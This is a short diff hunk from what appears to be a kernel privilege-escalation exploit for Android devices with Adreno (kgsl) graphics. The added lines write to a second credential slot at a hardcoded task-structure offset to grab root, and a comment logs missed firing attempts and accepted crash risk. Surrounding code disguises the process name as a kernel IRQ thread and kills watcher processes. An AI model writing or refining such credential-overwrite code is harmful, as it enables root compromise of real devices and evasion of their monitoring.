@@ -2260,6 +2260,13 @@ uid0_cred_punch:;
     prctl(PR_SET_NAME, "irq/0-kgsl", 0, 0, 0);
     uintptr_t slot = use_task + TASK_CRED_OFF;
     uid0_one_store(slot, self ? "self_cred" : "child_cred");
+    /* DOUBLE-PUNCH (08-30): single-slot child punches missed 3/3 clean-run
+     * fires (7/9/11 — full pipeline, no landing). The Z29 Image-verified
+     * slots are real_cred=0x778 / cred=0x780; the walk's fdset store can
+     * drift, and one of the two is the landing slot on a given boot. W3
+     * risk accepted — today's spray-free walks survive multi-walk boots
+     * (overnight: 3 processes x 2 walks on one 9h boot). */
+    uid0_one_store(use_task + 0x778, self ? "self_real_cred" : "child_real_cred");
     uid0_kill_watchers(watch, nw);
     nw = uid0_scan_watchers(watch, 32);
     uid0_kill_watchers(watch, nw);
